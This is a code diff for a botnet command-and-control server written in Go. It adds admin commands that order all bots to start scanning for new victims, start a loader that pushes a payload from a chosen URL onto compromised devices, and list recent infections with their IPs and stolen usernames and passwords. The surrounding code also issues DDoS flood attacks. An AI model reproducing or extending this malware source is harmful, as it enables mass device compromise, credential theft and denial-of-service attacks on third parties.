@@ -2,6 +2,7 @@ package handlers
 
 import (
 	"cnc/internal/config"
+	"cnc/internal/loader"
 	"cnc/internal/logger"
 	"cnc/internal/models"
 	"cnc/internal/state"
@@ -78,6 +79,12 @@ func ProcessCommand(user *models.User, command string, conn net.Conn, userIP str
 	case cmd == "!kickuser":
 		HandleKickUserCommand(user, command, conn)
 		return ""
+	case cmd == "!scan":
+		return handleScanCommand(user, command, conn)
+	case cmd == "!loader":
+		return handleLoaderCommand(user, command, conn)
+	case cmd == "!infections":
+		return handleInfectionsCommand(user)
 	case cmd == "!icmp" || cmd == "!gre":
 		HandleLayer3AttackCommand(user, command, conn)
 		return ""
@@ -91,15 +98,17 @@ func ProcessCommand(user *models.User, command string, conn net.Conn, userIP str
 
 func handleHelpCommand() string {
 	response := "\033[8;24;80t" + ui.CLEAR + ui.GREY2 + "\n Commands:\r\n" +
-		ui.GREY2 + "  !methods " + ui.WHITE + ":" + ui.GREY + " shows attack methods" + ui.WHITE + ".\r\n" +
-		ui.GREY2 + "  !admin   " + ui.WHITE + ":" + ui.GREY + " show admin and root commands" + ui.WHITE + ".\r\n" +
-		ui.GREY2 + "  !help    " + ui.WHITE + ":" + ui.GREY + " shows this msg" + ui.WHITE + ".\r\n" +
-		ui.GREY2 + "  !stopall " + ui.WHITE + ":" + ui.GREY + " stops all atks" + ui.WHITE + ".\r\n" +
-		ui.GREY2 + "  !opthelp " + ui.WHITE + ":" + ui.GREY + " see attack options" + ui.WHITE + ".\r\n" +
-		ui.GREY2 + "  !bots    " + ui.WHITE + ":" + ui.GREY + " list bots" + ui.WHITE + ".\r\n" +
-		ui.GREY2 + "  !user    " + ui.WHITE + ":" + ui.GREY + " show user or other users" + ui.WHITE + ".\r\n" +
-		ui.GREY2 + "  !clear   " + ui.WHITE + ":" + ui.GREY + " clear screen" + ui.WHITE + ".\r\n" +
-		ui.GREY2 + "  !exit    " + ui.WHITE + ":" + ui.GREY + " leave CNC\r\n" + ui.RESET
+		ui.GREY2 + "  !methods    " + ui.WHITE + ":" + ui.GREY + " shows attack methods" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !admin      " + ui.WHITE + ":" + ui.GREY + " show admin and root commands" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !help       " + ui.WHITE + ":" + ui.GREY + " shows this msg" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !stopall    " + ui.WHITE + ":" + ui.GREY + " stops all atks" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !bots       " + ui.WHITE + ":" + ui.GREY + " list bots" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !user       " + ui.WHITE + ":" + ui.GREY + " show user or other users" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !scan       " + ui.WHITE + ":" + ui.GREY + " scanner control (admin)" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !loader     " + ui.WHITE + ":" + ui.GREY + " loader control (admin)" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !infections " + ui.WHITE + ":" + ui.GREY + " recent infection reports (admin)" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !clear      " + ui.WHITE + ":" + ui.GREY + " clear screen" + ui.WHITE + ".\r\n" +
+		ui.GREY2 + "  !exit       " + ui.WHITE + ":" + ui.GREY + " leave CNC\r\n" + ui.RESET
 	return response
 }
 
@@ -313,4 +322,146 @@ func canUserAttack(user *models.User) bool {
 func incrementDailyUsed(user *models.User) {
 	user.DailyUsed++
 	saveUserDailyLimit(user)
+}
+
+/* ── Scanner & Loader Commands ── */
+
+func handleScanCommand(user *models.User, command string, conn net.Conn) string {
+	if !user.IsAdmin {
+		return ui.RED + "\rAdmin only command\n" + ui.RESET
+	}
+
+	parts := strings.Fields(command)
+	if len(parts) < 2 {
+		return ui.GREY2 + "\n Scanner:\r\n" +
+			ui.GREY2 + "  !scan on    " + ui.WHITE + ":" + ui.GREY + " start scanning on all bots\r\n" +
+			ui.GREY2 + "  !scan off   " + ui.WHITE + ":" + ui.GREY + " stop scanning on all bots\r\n" +
+			ui.GREY2 + "  !scan status" + ui.WHITE + ":" + ui.GREY + " show scanner/loader statistics\r\n" + ui.RESET
+	}
+
+	switch parts[1] {
+	case "on":
+		state.BotMutex.Lock()
+		sent := 0
+		for i := 0; i < state.BotCount; i++ {
+			if state.Bots[i].IsValid {
+				state.Bots[i].Conn.Write([]byte("scan_on"))
+				sent++
+			}
+		}
+		state.BotMutex.Unlock()
+		return fmt.Sprintf(ui.GREEN+"\rScanner enabled on %d bots\n"+ui.RESET, sent)
+
+	case "off":
+		state.BotMutex.Lock()
+		sent := 0
+		for i := 0; i < state.BotCount; i++ {
+			if state.Bots[i].IsValid {
+				state.Bots[i].Conn.Write([]byte("scan_off"))
+				sent++
+			}
+		}
+		state.BotMutex.Unlock()
+		return fmt.Sprintf(ui.YELLOW+"\rScanner disabled on %d bots\n"+ui.RESET, sent)
+
+	case "status":
+		s := loader.GetStats()
+		running := "OFF"
+		if loader.IsRunning() {
+			running = ui.GREEN + "ON" + ui.RESET
+		}
+		return fmt.Sprintf(
+			ui.GREY2+"\n Scanner/Loader Status:\r\n"+
+				ui.GREY2+"  Loader        "+ui.WHITE+": "+ui.GREY+"%s\r\n"+
+				ui.GREY2+"  Reports       "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
+				ui.GREY2+"  Queue         "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
+				ui.GREY2+"  Active workers"+ui.WHITE+": "+ui.GREY+"%d\r\n"+
+				ui.GREY2+"  Attempts      "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
+				ui.GREY2+"  Success       "+ui.WHITE+": "+ui.GREEN+"%d\r\n"+
+				ui.GREY2+"  Failed        "+ui.WHITE+": "+ui.RED+"%d\r\n"+ui.RESET,
+			running, s.TotalReports, s.QueueSize, s.ActiveLoaders,
+			s.TotalAttempts, s.TotalSuccess, s.TotalFailed)
+
+	default:
+		return ui.RED + "\rUsage: !scan <on|off|status>\n" + ui.RESET
+	}
+}
+
+func handleLoaderCommand(user *models.User, command string, conn net.Conn) string {
+	if !user.IsAdmin {
+		return ui.RED + "\rAdmin only command\n" + ui.RESET
+	}
+
+	parts := strings.Fields(command)
+	if len(parts) < 2 {
+		return ui.GREY2 + "\n Loader:\r\n" +
+			ui.GREY2 + "  !loader on <payload_url>  " + ui.WHITE + ":" + ui.GREY + " start loader with payload base URL\r\n" +
+			ui.GREY2 + "  !loader off              " + ui.WHITE + ":" + ui.GREY + " stop loader\r\n" +
+			ui.GREY2 + "  !loader status           " + ui.WHITE + ":" + ui.GREY + " show loader status\r\n" + ui.RESET
+	}
+
+	switch parts[1] {
+	case "on":
+		if len(parts) < 3 {
+			return ui.RED + "\rUsage: !loader on <http://your-ip>\n" + ui.RESET
+		}
+		payloadURL := parts[2]
+		loader.Start(payloadURL)
+		return fmt.Sprintf(ui.GREEN+"\rLoader started with payload: %s\n"+ui.RESET, payloadURL)
+
+	case "off":
+		loader.Stop()
+		return ui.YELLOW + "\rLoader stopped\n" + ui.RESET
+
+	case "status":
+		s := loader.GetStats()
+		running := ui.RED + "OFF" + ui.RESET
+		if loader.IsRunning() {
+			running = ui.GREEN + "ON" + ui.RESET
+		}
+		return fmt.Sprintf(
+			ui.GREY2+"\n Loader Status:\r\n"+
+				ui.GREY2+"  Status  "+ui.WHITE+": "+"%s\r\n"+
+				ui.GREY2+"  Queue   "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
+				ui.GREY2+"  Workers "+ui.WHITE+": "+ui.GREY+"%d\r\n"+
+				ui.GREY2+"  Success "+ui.WHITE+": "+ui.GREEN+"%d\r\n"+
+				ui.GREY2+"  Failed  "+ui.WHITE+": "+ui.RED+"%d\r\n"+ui.RESET,
+			running, s.QueueSize, s.ActiveLoaders, s.TotalSuccess, s.TotalFailed)
+
+	default:
+		return ui.RED + "\rUsage: !loader <on|off|status>\n" + ui.RESET
+	}
+}
+
+func handleInfectionsCommand(user *models.User) string {
+	if !user.IsAdmin {
+		return ui.RED + "\rAdmin only command\n" + ui.RESET
+	}
+
+	creds := loader.GetRecentCredentials(20)
+	if len(creds) == 0 {
+		return ui.YELLOW + "\rNo infection reports yet\n" + ui.RESET
+	}
+
+	var sb strings.Builder
+	sb.WriteString(ui.GREY2 + "\n Recent Infections:\r\n")
+
+	for _, c := range creds {
+		statusColor := ui.GREY
+		switch c.Status {
+		case "success":
+			statusColor = ui.GREEN
+		case "failed":
+			statusColor = ui.RED
+		case "loading":
+			statusColor = ui.YELLOW
+		}
+
+		sb.WriteString(fmt.Sprintf(
+			ui.GREY2+"  %s"+ui.WHITE+":"+ui.GREY+"%s  "+ui.GREY2+"%s/%s  "+statusColor+"[%s]"+ui.GREY+"  %s\r\n",
+			c.IP, c.Port, c.Username, c.Password, c.Status,
+			c.ReportedAt.Format("15:04:05")))
+	}
+	sb.WriteString(ui.RESET)
+	return sb.String()
 }
